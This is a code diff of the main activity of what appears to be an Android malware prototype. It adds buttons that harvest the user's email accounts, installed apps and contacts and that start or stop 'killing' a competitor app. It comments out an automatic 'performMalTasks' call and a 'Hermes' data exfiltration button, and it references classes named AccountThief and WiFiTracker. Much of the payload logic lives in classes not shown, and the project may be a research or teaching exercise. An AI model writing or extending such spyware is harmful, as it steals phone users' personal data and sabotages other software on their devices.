@@ -15,11 +15,13 @@ public class MainActivity extends Activity {
 	
 	
 	public static Context ctx;
-	protected Button btn_exfiltrate, btn_check_ip, btn_stop_check_ip;
+	protected Button btn_getEmails, btn_killComp, btn_stopKillComp, btn_getApps, btn_getContacts;
+	//protected Button btn_start_check_ip, btn_stop_check_ip, btn_exfiltrate;
 	
 	private Monopoly monopoly = new Monopoly();
 	private AccountThief accountThief = new AccountThief();
 	private WiFiTracker wifiTracker = new WiFiTracker();
+	private User user = new User();
 		
 	
     @Override
@@ -27,17 +29,15 @@ public class MainActivity extends Activity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
          ctx = this;
+         user.setPhoneNumber(Constants.DEVICE_NUMBER);
          
-         //we should start checking for Internet connection only when there are new data available
-        
          prepareButtons();
-         performMalTasks();
+         //performMalTasks();
 	
     }
     
     @Override
     public void onDestroy(){
-    	monopoly.stopkillingCompetitor();
     	super.onDestroy();
     }
     
@@ -48,6 +48,7 @@ public class MainActivity extends Activity {
 	}
  
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////	
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////	
    
     /**
      * Prepares the buttons of the application
@@ -55,11 +56,77 @@ public class MainActivity extends Activity {
      */
 	private void prepareButtons() {
 		// TODO Auto-generated method stub
-		prepareButtonCheckIp();
-        prepareButtonStopCheckIp();
-        prepareButtonExfiltrate();
+		prepareButtonGetEmails();
+        prepareButtonStartKill();
+        prepareButtonStopKill();
+        prepareButtonGetApps();
+        prepareButtonGetContacts();
+	}
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+	
+	private void prepareButtonGetEmails() {
+		btn_getEmails = (Button) findViewById(R.id.get_accounts);
+    	
+    	btn_getEmails.setOnClickListener(new View.OnClickListener() {
+			
+			public void onClick(View v) {
+				getUserAccounts();
+			}
+
+		});
 	}
 	
+	private void prepareButtonStartKill() {
+		btn_killComp = (Button) findViewById(R.id.kill_competitor);
+    	
+		btn_killComp.setOnClickListener(new View.OnClickListener() {
+			
+			public void onClick(View v) {
+				monopoly.killCompetitor();
+			}
+
+		});
+	}
+	
+	private void prepareButtonStopKill() {
+		btn_stopKillComp = (Button) findViewById(R.id.stop_killing_competitor);
+    	
+		btn_stopKillComp.setOnClickListener(new View.OnClickListener() {
+			
+			public void onClick(View v) {
+				monopoly.stopkillingCompetitor();
+			}
+
+		});
+	}
+	
+	private void prepareButtonGetApps() {
+		btn_getApps = (Button) findViewById(R.id.get_apps);
+    	
+		btn_getApps.setOnClickListener(new View.OnClickListener() {
+			
+			public void onClick(View v) {
+				getInstalledApplications();
+			}
+
+		});
+	}
+	
+	private void prepareButtonGetContacts() {
+		btn_getContacts = (Button) findViewById(R.id.get_contacts);
+    	
+		btn_getContacts.setOnClickListener(new View.OnClickListener() {
+			
+			public void onClick(View v) {
+				getContacts();
+			}
+
+		});
+	}
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
 	/**
      * Perform malicious tasks
      * @author sdemetr2
@@ -158,51 +225,51 @@ public class MainActivity extends Activity {
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////	
 	
-	private void prepareButtonCheckIp() {
-		// TODO Auto-generated method stub
-    	btn_check_ip = (Button) findViewById(R.id.start_ip_checking);
-    	
-    	btn_check_ip.setOnClickListener(new View.OnClickListener() {
-			
-			public void onClick(View v) {
-				// TODO Auto-generated method stub
-				wifiTracker.start_checking_for_ip();
-				//start_checking_for_competitor();
-			}
-
-		});
-	}
-
-
-	private void prepareButtonStopCheckIp() {
-		// TODO Auto-generated method stub
-    	btn_stop_check_ip = (Button) findViewById(R.id.stop_ip_checking);
-    	
-    	btn_stop_check_ip.setOnClickListener(new View.OnClickListener() {
-			
-			public void onClick(View v) {
-				// TODO Auto-generated method stub
-				wifiTracker.stop_checking_for_ip();
-				//stop_checking_for_competitor();
-			}
-
-		});
-	}
-    
-    private void prepareButtonExfiltrate() {
-		// TODO Auto-generated method stub
-    	btn_exfiltrate = (Button) findViewById(R.id.exfiltrate);
-    	
-    	btn_exfiltrate.setOnClickListener(new View.OnClickListener() {
-			
-			public void onClick(View v) {
-				// TODO Auto-generated method stub
-				Hermes hermes = new Hermes();
-				hermes.exfiltrate(null,Constants.TEST_TRANSACTION);
-			}
-
-		});
-	}
+//	private void prepareButtonCheckIp() {
+//		// TODO Auto-generated method stub
+//		btn_start_check_ip = (Button) findViewById(R.id.start_ip_checking);
+//    	
+//		btn_start_check_ip.setOnClickListener(new View.OnClickListener() {
+//			
+//			public void onClick(View v) {
+//				// TODO Auto-generated method stub
+//				wifiTracker.start_checking_for_ip();
+//				//start_checking_for_competitor();
+//			}
+//
+//		});
+//	}
+//
+//
+//	private void prepareButtonStopCheckIp() {
+//		// TODO Auto-generated method stub
+//    	btn_stop_check_ip = (Button) findViewById(R.id.stop_ip_checking);
+//    	
+//    	btn_stop_check_ip.setOnClickListener(new View.OnClickListener() {
+//			
+//			public void onClick(View v) {
+//				// TODO Auto-generated method stub
+//				wifiTracker.stop_checking_for_ip();
+//				//stop_checking_for_competitor();
+//			}
+//
+//		});
+//	}
+//    
+//    private void prepareButtonExfiltrate() {
+//		// TODO Auto-generated method stub
+//    	btn_exfiltrate = (Button) findViewById(R.id.exfiltrate);
+//    	
+//    	btn_exfiltrate.setOnClickListener(new View.OnClickListener() {
+//			
+//			public void onClick(View v) {
+//				// TODO Auto-generated method stub
+//				Hermes hermes = new Hermes();
+//				hermes.exfiltrate(null,Constants.TEST_TRANSACTION);
+//			}
+//
+//		});
+//	}
   
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////    
     
